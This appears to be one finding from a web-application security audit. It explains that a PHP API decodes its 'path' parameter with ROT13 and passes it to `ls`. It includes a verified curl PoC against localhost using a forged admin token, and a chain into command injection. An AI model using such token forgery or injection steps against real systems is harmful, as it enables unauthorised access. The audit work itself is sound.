# 27 — ROT13 used as “encryption”

- **OWASP Top 10 (2021):** A02:2021 – Cryptographic Failures
- **Severity:** Low
- **Difficulty:** Easy

## Where

`web/includes/auth.php:56-58`:

```php
function r13($s) {
    return str_rot13($s);
}
```

`web/api/v1/uplist/index.php:24`:

```php
$path = str_rot13(isset($_POST['path']) ? $_POST['path'] : '');
```

## How it works (root cause)

ROT13 is a fixed Caesar cipher with a 13-letter shift. It is its own inverse
and has no secret key. Treating it as obfuscation or encryption gives a false
sense of security: anyone who sees the code can reverse every value instantly.

## Exploitation steps

1. See that the API decodes `path` with ROT13 before passing it to `ls`.
2. Compute the ROT13 of a known file name:

   ```bash
   php -r 'echo str_rot13("index.php"), PHP_EOL;'
   # vaqrk.cuc
   ```

3. Submit the ROT13-encoded value to the API.

## Working PoC (verified)

With a valid/forged admin token (see 18/28):

```bash
TOKEN=$(php /tmp/opencode/mktoken.php admin 1)
curl -s \
  -H "Authorization: Bearer ${TOKEN}" \
  --data-urlencode 'path=vaqrk.cuc' \
  http://127.0.0.1:8080/api/v1/uplist/index.php
```

Output:

```text
index.php
HTTP_CODE=200
```

The server decoded `vaqrk.cuc` to `index.php` and executed `ls index.php`.

## Expected result / verification

- Any ROT13 value sent by the attacker is trivially decoded.
- The endpoint behaves exactly as if the attacker had supplied the plaintext
  path directly.

## Attack chain

```
ROT13 “secret” in API input
  → attacker pre-encodes commands / paths
  → command injection (17) or path probing
```

## Notes

- ROT13 is not a cipher with a key; it is a reversible letter substitution.
- This finding is Low by itself, but it explains why the input to 17 can be
  controlled with full knowledge of the transformation.
